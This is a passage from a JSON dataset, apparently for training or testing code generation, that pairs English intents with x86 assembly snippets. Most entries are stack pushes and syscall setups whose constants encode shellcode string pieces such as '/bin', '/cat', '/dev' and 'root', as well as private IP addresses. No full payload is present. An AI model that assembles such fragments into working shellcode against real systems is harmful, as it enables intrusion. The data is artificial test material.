    "rewritten_intent": "push 0x74 to the stack",
    "snippet": "push 0x74",
    "slot_map": {
      "0x74": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x742f2f2f onto the stack",
    "rewritten_intent": "push 0x742f2f2f onto the stack",
    "snippet": "push 0x742f2f2f",
    "slot_map": {
      "0x742f2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x742f2f2f onto the stack",
    "rewritten_intent": "push the 0x742f2f2f onto the stack",
    "snippet": "push 0x742f2f2f",
    "slot_map": {
      "0x742f2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x742f3a31 onto the stack",
    "rewritten_intent": "push 0x742f3a31 onto the stack",
    "snippet": "push 0x742f3a31",
    "slot_map": {
      "0x742f3a31": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x74303072 onto the stack",
    "rewritten_intent": "push 0x74303072 onto the stack",
    "snippet": "push 0x74303072",
    "slot_map": {
      "0x74303072": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register",
    "snippet": "push 0x7461632f \\n push 0x6e69622f \\n mov eax, esp",
    "slot_map": {
      "0x7461632f": "var0",
      "0x6e69622f": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x7461632f \\n push 0x6e69622f \\n mov ebx, esp",
    "slot_map": {
      "0x7461632f": "var0",
      "0x6e69622f": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ecx register to the stack register",
    "snippet": "push 0x7461632f \\n push 0x6e69622f \\n mov ecx, esp",
    "slot_map": {
      "0x7461632f": "var0",
      "0x6e69622f": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register",
    "rewritten_intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register",
    "snippet": "push 0x7461632f \\n push 0x6e69622f \\n mov edi, esp",
    "slot_map": {
      "0x7461632f": "var0",
      "0x6e69622f": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register",
    "snippet": "push 0x7461632f \\n push 0x6e69622f \\n mov edx, esp",
    "slot_map": {
      "0x7461632f": "var0",
      "0x6e69622f": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register",
    "snippet": "push 0x7461632f \\n push 0x6e69622f \\n mov esi, esp",
    "slot_map": {
      "0x7461632f": "var0",
      "0x6e69622f": "var1",
      "esi": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the 0x74652f2f onto the stack",
    "rewritten_intent": "push the 0x74652f2f onto the stack",
    "snippet": "push 0x74652f2f",
    "slot_map": {
      "0x74652f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x74652f2f onto the stack",
    "rewritten_intent": "push 0x74652f2f onto the stack",
    "snippet": "push 0x74652f2f",
    "slot_map": {
      "0x74652f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x746f6f72 onto the stack",
    "rewritten_intent": "push 0x746f6f72 onto the stack",
    "snippet": "push 0x746f6f72",
    "slot_map": {
      "0x746f6f72": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x74756873 onto the stack",
    "rewritten_intent": "push the 0x74756873 onto the stack",
    "snippet": "push 0x74756873",
    "slot_map": {
      "0x74756873": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x74756f2f onto the stack",
    "rewritten_intent": "push 0x74756f2f onto the stack",
    "snippet": "push 0x74756f2f",
    "slot_map": {
      "0x74756f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x74756f2f onto the stack",
    "rewritten_intent": "push the 0x74756f2f onto the stack",
    "snippet": "push 0x74756f2f",
    "slot_map": {
      "0x74756f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x752f2f2f onto the stack",
    "rewritten_intent": "push 0x752f2f2f onto the stack",
    "snippet": "push 0x752f2f2f",
    "slot_map": {
      "0x752f2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x752f2f2f to the stack",
    "rewritten_intent": "push 0x752f2f2f to the stack",
    "snippet": "push 0x752f2f2f",
    "slot_map": {
      "0x752f2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x7665642f onto the stack",
    "rewritten_intent": "push 0x7665642f onto the stack",
    "snippet": "push 0x7665642f",
    "slot_map": {
      "0x7665642f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x7665642f onto the stack",
    "rewritten_intent": "push the 0x7665642f onto the stack",
    "snippet": "push 0x7665642f",
    "slot_map": {
      "0x7665642f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x76766c2d onto the stack",
    "rewritten_intent": "push 0x76766c2d onto the stack",
    "snippet": "push 0x76766c2d",
    "slot_map": {
      "0x76766c2d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x76766c2d to the stack",
    "rewritten_intent": "push 0x76766c2d to the stack",
    "snippet": "push 0x76766c2d",
    "slot_map": {
      "0x76766c2d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x76766c2d onto the stack",
    "rewritten_intent": "push the 0x76766c2d onto the stack",
    "snippet": "push 0x76766c2d",
    "slot_map": {
      "0x76766c2d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x78 onto the stack",
    "rewritten_intent": "push 0x78 onto the stack",
    "snippet": "push 0x78",
    "slot_map": {
      "0x78": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x78 to the stack",
    "rewritten_intent": "push 0x78 to the stack",
    "snippet": "push 0x78",
    "slot_map": {
      "0x78": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x78 onto the stack",
    "rewritten_intent": "push the 0x78 onto the stack",
    "snippet": "push 0x78",
    "slot_map": {
      "0x78": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x782f2f32 onto the stack",
    "rewritten_intent": "push 0x782f2f32 onto the stack",
    "snippet": "push 0x782f2f32",
    "slot_map": {
      "0x782f2f32": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x782f2f32 to the stack",
    "rewritten_intent": "push 0x782f2f32 to the stack",
    "snippet": "push 0x782f2f32",
    "slot_map": {
      "0x782f2f32": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x782f6e69 onto the stack",
    "rewritten_intent": "push 0x782f6e69 onto the stack",
    "snippet": "push 0x782f6e69",
    "slot_map": {
      "0x782f6e69": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x782f6e69 to the stack",
    "rewritten_intent": "push 0x782f6e69 to the stack",
    "snippet": "push 0x782f6e69",
    "slot_map": {
      "0x782f6e69": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x78534a52 onto the stack",
    "rewritten_intent": "push 0x78534a52 onto the stack",
    "snippet": "push 0x78534a52",
    "slot_map": {
      "0x78534a52": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x79616c70 to the stack",
    "rewritten_intent": "push 0x79616c70 to the stack",
    "snippet": "push 0x79616c70",
    "slot_map": {
      "0x79616c70": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x79616c70 onto the stack",
    "rewritten_intent": "push 0x79616c70 onto the stack",
    "snippet": "push 0x79616c70",
    "slot_map": {
      "0x79616c70": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x8 onto the stack",
    "rewritten_intent": "push 0x8 onto the stack",
    "snippet": "push 0x8",
    "slot_map": {
      "0x8": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x81e3a8c0 onto the stack",
    "rewritten_intent": "push 0x81e3a8c0 onto the stack",
    "snippet": "push 0x81e3a8c0",
    "slot_map": {
      "0x81e3a8c0": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x8501a8c0 onto the stack",
    "rewritten_intent": "push 0x8501a8c0 onto the stack",
    "snippet": "push 0x8501a8c0",
    "slot_map": {
      "0x8501a8c0": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0xa onto the stack",
    "rewritten_intent": "push 0xa onto the stack",
    "snippet": "push 0xa",
    "slot_map": {
      "0xa": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0xa to the stack",
    "rewritten_intent": "push 0xa to the stack",
    "snippet": "push 0xa",
    "slot_map": {
      "0xa": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0xa01a8c0 onto the stack",
    "rewritten_intent": "push the 0xa01a8c0 onto the stack",
    "snippet": "push 0xa01a8c0",
    "slot_map": {
      "0xa01a8c0": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0xb to the stack",
    "rewritten_intent": "push 0xb to the stack",
    "snippet": "push 0xb",
    "slot_map": {
      "0xb": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0xb onto the stack",
    "rewritten_intent": "push 0xb onto the stack",
    "snippet": "push 0xb",
    "slot_map": {
      "0xb": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0xdebf value to the stack",
    "rewritten_intent": "push 0xdebf value to the stack",
    "snippet": "push 0xdebf",
    "slot_map": {
      "0xdebf": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "value",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0xefffff7f onto the stack",
    "rewritten_intent": "push 0xefffff7f onto the stack",
    "snippet": "push 0xefffff7f",
    "slot_map": {
      "0xefffff7f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0xf onto the stack",
    "rewritten_intent": "push 0xf onto the stack",
    "snippet": "push 0xf",
    "slot_map": {
      "0xf": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 1 to the stack",
    "rewritten_intent": "push 1 to the stack",
    "snippet": "push 1",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "1",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "1"
    ]
  },
  {
    "intent": "push 1 onto the stack",
    "rewritten_intent": "push 1 onto the stack",
    "snippet": "push 1",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "1",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "1"
    ]
  },
  {
    "intent": "push 10 onto the stack",
    "rewritten_intent": "push 10 onto the stack",
    "snippet": "push 10",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "10",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "10"
    ]
  },
  {
    "intent": "push the value 10 onto the stack and point eax to the stack register",
    "rewritten_intent": "push the value 10 onto the stack and point eax to the stack register",
    "snippet": "push 10 \\n mov eax, esp",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "10",
      "stack",
      "and",
      "point",
      "var0",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "10",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 102 onto the stack",
    "rewritten_intent": "push 102 onto the stack",
    "snippet": "push 102",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "102",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "102"
    ]
  },
  {
    "intent": "push the value 12 onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the value 12 onto the stack and point ebx to the stack register",
    "snippet": "push 12 \\n mov ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "12",
      "stack",
      "and",
      "point",
      "var0",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "12",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 15 onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the value 15 onto the stack and point ecx to the stack register",
    "snippet": "push 15 \\n mov ecx, esp",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "15",
      "stack",
      "and",
      "point",
      "var0",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "15",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 16 onto the stack",
    "rewritten_intent": "push 16 onto the stack",
    "snippet": "push 16",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "16",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "16"
    ]
  },
  {
    "intent": "push 2 onto the stack",
    "rewritten_intent": "push 2 onto the stack",
    "snippet": "push 2",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "2",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "2"
    ]
  },
  {
    "intent": "push 20 onto the stack",
    "rewritten_intent": "push 20 onto the stack",
    "snippet": "push 20",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "20",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "20"
    ]
  },
  {
    "intent": "push the 20 onto the stack",
    "rewritten_intent": "push the 20 onto the stack",
    "snippet": "push 20",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "20",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "20"
    ]
  },
  {
    "intent": "push 216 value to the stack",
    "rewritten_intent": "push 216 value to the stack",
    "snippet": "push 216",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "216",
      "value",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "216"
    ]
  },
  {
    "intent": "push 6 onto the stack",
    "rewritten_intent": "push 6 onto the stack",
    "snippet": "push 6",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "6",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "6"
    ]
  },
  {
    "intent": "push ax onto the stack",
    "rewritten_intent": "push ax onto the stack",
    "snippet": "push ax",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "ax",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "ax"
    ]
  },
  {
    "intent": "push ax to the stack",
    "rewritten_intent": "push ax to the stack",
    "snippet": "push ax",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "ax",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "ax"
    ]
  },
  {
    "intent": "push the ax onto the stack",
    "rewritten_intent": "push the ax onto the stack",
    "snippet": "push ax",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "ax",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "ax"
    ]
  },
  {
    "intent": "push bx onto the stack",
    "rewritten_intent": "push bx onto the stack",
    "snippet": "push bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push bx to the stack",
    "rewritten_intent": "push bx to the stack",
    "snippet": "push bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the bx register onto the stack",
    "rewritten_intent": "push the contents of the bx register onto the stack",
    "snippet": "push bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte -1 onto the stack",
    "rewritten_intent": "push the byte -1 onto the stack",
    "snippet": "push byte -1",
    "slot_map": {
      "byte -1": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0x1 onto the stack",
    "rewritten_intent": "push the byte +0x1 onto the stack",
    "snippet": "push byte +0x1",
    "slot_map": {
      "byte +0x1": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0x10 onto the stack",
    "rewritten_intent": "push the byte +0x10 onto the stack",
    "snippet": "push byte +0x10",
    "slot_map": {
      "byte +0x10": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0x2 onto the stack",
    "rewritten_intent": "push the byte +0x2 onto the stack",
    "snippet": "push byte +0x2",
    "slot_map": {
      "byte +0x2": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0x3 onto the stack",
    "rewritten_intent": "push the byte +0x3 onto the stack",
    "snippet": "push byte +0x3",
    "slot_map": {
      "byte +0x3": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0x46 onto the stack",
    "rewritten_intent": "push the byte +0x46 onto the stack",
    "snippet": "push byte +0x46",
    "slot_map": {
      "byte +0x46": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0x6 onto the stack",
    "rewritten_intent": "push the byte +0x6 onto the stack",
    "snippet": "push byte +0x6",
    "slot_map": {
      "byte +0x6": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0x66 onto the stack",
    "rewritten_intent": "push the byte +0x66 onto the stack",
    "snippet": "push byte +0x66",
    "slot_map": {
      "byte +0x66": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0x7f onto the stack",
    "rewritten_intent": "push the byte +0x7f onto the stack",
    "snippet": "push byte +0x7f",
    "slot_map": {
      "byte +0x7f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0x8 onto the stack",
    "rewritten_intent": "push the byte +0x8 onto the stack",
    "snippet": "push byte +0x8",
    "slot_map": {
      "byte +0x8": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the byte +0xb onto the stack",
    "rewritten_intent": "push the byte +0xb onto the stack",
    "snippet": "push byte +0xb",
    "slot_map": {
      "byte +0xb": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push byte 0 onto stack",
    "rewritten_intent": "push byte 0 onto stack",
    "snippet": "push byte 0",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "0"
    ]
  },
  {
    "intent": "push the byte 0x0 onto the stack",
    "rewritten_intent": "push the byte 0x0 onto the stack",
    "snippet": "push byte 0x0",
    "slot_map": {
      "0x0": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "push the byte 0x01 onto the stack",
    "rewritten_intent": "push the byte 0x01 onto the stack",
    "snippet": "push byte 0x01",
    "slot_map": {
      "0x01": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "push the byte 0x01 to the stack",
    "rewritten_intent": "push the byte 0x01 to the stack",
    "snippet": "push byte 0x01",
    "slot_map": {
      "0x01": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x01 into the eax register",
    "rewritten_intent": "put the syscall 0x01 into the eax register",
    "snippet": "push byte 0x01 \\n pop eax",
    "slot_map": {
      "0x01": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x02 onto the stack",
    "rewritten_intent": "push the byte 0x02 onto the stack",
    "snippet": "push byte 0x02",
    "slot_map": {
      "0x02": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "push the byte 0x02 to the stack",
    "rewritten_intent": "push the byte 0x02 to the stack",
    "snippet": "push byte 0x02",
    "slot_map": {
      "0x02": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x02 into the eax register",
    "rewritten_intent": "put the syscall 0x02 into the eax register",
    "snippet": "push byte 0x02 \\n pop eax",
    "slot_map": {
      "0x02": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x04 onto the stack",
    "rewritten_intent": "push the byte 0x04 onto the stack",
    "snippet": "push byte 0x04",
    "slot_map": {
      "0x04": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x04 into the eax register",
    "rewritten_intent": "put the syscall 0x04 into the eax register",
    "snippet": "push byte 0x04 \\n pop eax",
    "slot_map": {
      "0x04": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x05 onto the stack",
    "rewritten_intent": "push the byte 0x05 onto the stack",
    "snippet": "push byte 0x05",
    "slot_map": {
      "0x05": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x05 into the eax register",
    "rewritten_intent": "put the syscall 0x05 into the eax register",
    "snippet": "push byte 0x05 \\n pop eax",
    "slot_map": {
      "0x05": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the byte 0x06 onto the stack",
    "rewritten_intent": "push the byte 0x06 onto the stack",
    "snippet": "push byte 0x06",
    "slot_map": {
      "0x06": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 0x06 into the eax register",
    "rewritten_intent": "put the syscall 0x06 into the eax register",
    "snippet": "push byte 0x06 \\n pop eax",
